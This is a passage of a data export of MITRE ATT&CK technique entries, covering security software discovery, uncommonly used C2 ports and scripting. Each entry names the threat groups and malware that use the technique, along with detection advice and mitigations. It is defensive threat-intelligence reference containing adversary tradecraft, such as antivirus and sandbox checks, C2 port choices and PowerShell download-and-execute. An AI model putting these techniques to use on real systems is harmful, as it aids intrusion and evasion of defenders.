'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",[],Software: Tasklist,['Discovery'],['Technique/T1063'],['Security Software Discovery'],https://attack.mitre.org/wiki/Technique/T1063
1219,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0057|Tasklist]] can be used to enumerate security software currently running on a system by process name of known products.[[CiteRef::Microsoft Tasklist]]'],['Naikon'],['Naikon'],['G0019'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about local security software, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",[],Software: Tasklist,['Discovery'],['Technique/T1063'],['Security Software Discovery'],https://attack.mitre.org/wiki/Technique/T1063
1220,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0108|netsh]] can be used to discover system firewall settings.[[CiteRef::TechNet Netsh Firewall]]'],['Naikon'],['Naikon'],['G0019'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about local security software, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",[],"Software: netsh, netsh.exe",['Discovery'],['Technique/T1063'],['Security Software Discovery'],https://attack.mitre.org/wiki/Technique/T1063
1221,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0019|Naikon]] uses commands such as <code>netsh advfirewall firewall</code> to discover local firewall settings.[[CiteRef::Baumgartner Naikon 2015]]'],['Naikon'],['Naikon'],['G0019'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about local security software, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",[],[],['Discovery'],['Technique/T1063'],['Security Software Discovery'],https://attack.mitre.org/wiki/Technique/T1063
1222,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']","['The main [[Software/S0046|CozyCar]] dropper checks whether the victim has an anti-virus product installed. If the installed product is on a predetermined list, the dropper will exit. Newer versions of [[Software/S0046|CozyCar]] will check to ensure it is not being executed inside a virtual machine or a known malware analysis sandbox environment. If it detects that it is, it will exit. [[CiteRef::F-Secure CozyDuke]]']",['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about local security software, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",[],"Software: CozyCar, CozyDuke, ...",['Discovery'],['Technique/T1063'],['Security Software Discovery'],https://attack.mitre.org/wiki/Technique/T1063
1223,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0108|netsh]] can be used to discover system firewall settings.[[CiteRef::TechNet Netsh Firewall]]'],['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about local security software, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",[],"Software: netsh, netsh.exe",['Discovery'],['Technique/T1063'],['Security Software Discovery'],https://attack.mitre.org/wiki/Technique/T1063
1224,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0062|DustySky]] checks for the existence of anti-virus.[[CiteRef::DustySky]]'],['Molerats'],"['Molerats', 'Gaza cybergang', 'Operation Molerats']",['G0021'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about local security software, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",[],"Software: DustySky, NeD Worm",['Discovery'],['Technique/T1063'],['Security Software Discovery'],https://attack.mitre.org/wiki/Technique/T1063
1225,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",[u'[[Group/G0040|Patchwork]] scanned the \u201cProgram Files\u201d directories for a directory with the string \u201cTotal Security\u201d (the installation path of the \u201c360 Total Security\u201d antivirus tool).[[CiteRef::Cymmetria Patchwork]]'],['Patchwork'],"['Patchwork', 'Dropping Elephant', 'Chinastrats']",['G0040'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about local security software, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",[],[],['Discovery'],['Technique/T1063'],['Security Software Discovery'],https://attack.mitre.org/wiki/Technique/T1063
1226,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']","['[[Group/G0043|Group5]] C2 servers communicated with malware over TCP 8081, 8282, and 8083.[[CiteRef::Citizen Lab Group5]]']",['Group5'],['Group5'],['G0043'],"['Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports. \n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],['Technique/T1065'],['Uncommonly Used Port'],https://attack.mitre.org/wiki/Technique/T1065
1227,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']",['A [[Software/S0125|Remsec]] module has a default C2 port of 13000.[[CiteRef::Kaspersky ProjectSauron Technical Analysis]]'],['Strider'],"['Strider', 'ProjectSauron']",['G0041'],"['Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports. \n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: Remsec, Backdoor.Remsec, ProjectSauron",['Command and Control'],['Technique/T1065'],['Uncommonly Used Port'],https://attack.mitre.org/wiki/Technique/T1065
1228,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']",['A variant of [[Software/S0045|ADVSTORESHELL]] attempts communication to the C2 server over HTTP on port 443.[[CiteRef::Bitdefender APT28 Dec 2015]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports. \n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: ADVSTORESHELL, NETUI, ...",['Command and Control'],['Technique/T1065'],['Uncommonly Used Port'],https://attack.mitre.org/wiki/Technique/T1065
1229,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']",['[[Software/S0079|MobileOrder]] communicates with its C2 server over TCP port 3728.[[CiteRef::Scarlet Mimic Jan 2016]]'],['Scarlet Mimic'],['Scarlet Mimic'],['G0029'],"['Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports. \n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: MobileOrder,['Command and Control'],['Technique/T1065'],['Uncommonly Used Port'],https://attack.mitre.org/wiki/Technique/T1065
1230,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']","['Some [[Group/G0032|Lazarus Group]] malware uses a list of ordered port numbers to choose a port for C2 traffic, which includes uncommonly used ports such as 995, 1816, 465, 1521, 3306, and many others.[[CiteRef::Novetta Blockbuster RATs]]']",['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports. \n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],['Technique/T1065'],['Uncommonly Used Port'],https://attack.mitre.org/wiki/Technique/T1065
1231,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']",['An [[Group/G0022|APT3]] downloader establishes SOCKS5 connections to two separate IP addresses over TCP port 1913 and TCP port 81.[[CiteRef::FireEye Operation Double Tap]]'],['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],"['Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports. \n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],['Technique/T1065'],['Uncommonly Used Port'],https://attack.mitre.org/wiki/Technique/T1065
1232,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']",['[[Software/S0064|ELMER]] uses HTTP over port 443 for command and control.[[CiteRef::FireEye EPS Awakens Part 2]]'],['APT16'],['APT16'],['G0023'],"['Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports. \n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: ELMER,['Command and Control'],['Technique/T1065'],['Uncommonly Used Port'],https://attack.mitre.org/wiki/Technique/T1065
1233,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']",['[[Software/S0153|RedLeaves]] can use port 995 for C2.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports. \n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: RedLeaves, BUGJUICE",['Command and Control'],['Technique/T1065'],['Uncommonly Used Port'],https://attack.mitre.org/wiki/Technique/T1065
1234,"['Scripting may be common on admin, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information [[Discovery]], [[Collection]], or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.']",['Process whitelisting'],[],[],"['Process monitoring', 'File monitoring', 'Process command-line parameters']","['[[Group/G0009|Deep Panda]] has used PowerShell scripts to download and execute programs in memory, without writing to disk.[[CiteRef::Alperovitch 2014]]']",['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],['Turn off unused features or restrict access to scripting engines such as VBScript or scriptable administration frameworks such as PowerShell.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],"['Defense Evasion', 'Execution']",['Technique/T1064'],['Scripting'],https://attack.mitre.org/wiki/Technique/T1064
1235,"['Scripting may be common on admin, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information [[Discovery]], [[Collection]], or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.']",['Process whitelisting'],[],[],"['Process monitoring', 'File monitoring', 'Process command-line parameters']","['[[Group/G0047|Gamaredon Group]] has used various batch scripts to establish C2, download additional files, and conduct other functions.[[CiteRef::Palo Alto Gamaredon Feb 2017]]']",['Gamaredon Group'],['Gamaredon Group'],['G0047'],['Turn off unused features or restrict access to scripting engines such as VBScript or scriptable administration frameworks such as PowerShell.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],"['Defense Evasion', 'Execution']",['Technique/T1064'],['Scripting'],https://attack.mitre.org/wiki/Technique/T1064
1236,"['Scripting may be common on admin, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information [[Discovery]], [[Collection]], or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.']",['Process whitelisting'],[],[],"['Process monitoring', 'File monitoring', 'Process command-line parameters']",['[[Group/G0006|APT1]] has used batch scripting to automate execution of commands.[[CiteRef::Mandiant APT1]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],['Turn off unused features or restrict access to scripting engines such as VBScript or scriptable administration frameworks such as PowerShell.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],"['Defense Evasion', 'Execution']",['Technique/T1064'],['Scripting'],https://attack.mitre.org/wiki/Technique/T1064
1237,"['Scripting may be common on admin, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information [[Discovery]], [[Collection]], or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.']",['Process whitelisting'],[],[],"['Process monitoring', 'File monitoring', 'Process command-line parameters']",['[[Group/G0038|Stealth Falcon]] malware uses PowerShell and WMI to script data collection and command execution on the victim.[[CiteRef::Citizen Lab Stealth Falcon May 2016]]'],['Stealth Falcon'],['Stealth Falcon'],['G0038'],['Turn off unused features or restrict access to scripting engines such as VBScript or scriptable administration frameworks such as PowerShell.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],"['Defense Evasion', 'Execution']",['Technique/T1064'],['Scripting'],https://attack.mitre.org/wiki/Technique/T1064
1238,"['Scripting may be common on admin, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information [[Discovery]], [[Collection]], or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.']",['Process whitelisting'],[],[],"['Process monitoring', 'File monitoring', 'Process command-line parameters']",['[[Group/G0051|FIN10]] has executed malicious .bat files containing PowerShell commands.[[CiteRef::FireEye FIN10 June 2017]]'],['FIN10'],['FIN10'],['G0051'],['Turn off unused features or restrict access to scripting engines such as VBScript or scriptable administration frameworks such as PowerShell.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],"['Defense Evasion', 'Execution']",['Technique/T1064'],['Scripting'],https://attack.mitre.org/wiki/Technique/T1064
1239,"['Scripting may be common on admin, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information [[Discovery]], [[Collection]], or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.']",['Process whitelisting'],[],[],"['Process monitoring', 'File monitoring', 'Process command-line parameters']","['[[Group/G0037|FIN6]] has used a Metasploit PowerShell module to download and execute shellcode and to set up a local listener. [[Group/G0037|FIN6]] has also used scripting to iterate through a list of compromised PoS systems, copy data to a log file, and remove the original data files.[[CiteRef::FireEye FIN6 April 2016]]']",['FIN6'],['FIN6'],['G0037'],['Turn off unused features or restrict access to scripting engines such as VBScript or scriptable administration frameworks such as PowerShell.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows 